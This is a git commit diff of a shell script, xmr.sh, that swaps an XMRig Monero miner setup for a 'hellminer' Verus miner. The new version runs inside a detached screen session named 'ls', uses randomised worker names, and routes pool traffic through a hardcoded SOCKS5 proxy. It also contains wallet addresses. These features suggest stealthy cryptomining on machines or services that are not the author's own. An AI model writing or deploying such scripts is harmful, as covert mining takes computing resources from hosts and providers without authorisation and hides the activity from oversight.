3498581008579292bc8fc1f7f9fdc8c8c0c5a32f
Kambuhlagi <96752054+Kambuhlagi@users.noreply.github.com>
2022-04-08 13:59:27 +0700

    Update xmr.sh

--- xmr.sh
+++ xmr.sh
@@ -1,4 +1,8 @@
-#!/bin/bash
-wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
-xmrig-6.17.0-linux-x64.tar.gz
-./xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u XMR:89vETEeFsvbLmtHqyJTkyNa1zvdiUsSs61Cm9ssHQBjcf8RA4bQKMUU6fHDYGxkzEjRJkzJ3qiCauLbHigUMLaxERL49cVJ.QEWE_NAME -p x
+sudo apt update 
+sudo apt install screen libjansson4 -y
+screen -dmS ls 
+POOL=stratum+tcp://eu.luckpool.net:3956
+WALLET=RTB8Yi3AbEqHqrsjs1VXm8YCssK8xfZMce
+WORKER=$(echo $(shuf -i 1-10 -n 1)BEH)
+PROXY=socks5://178.162.111.220:1080
+./hellminer -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
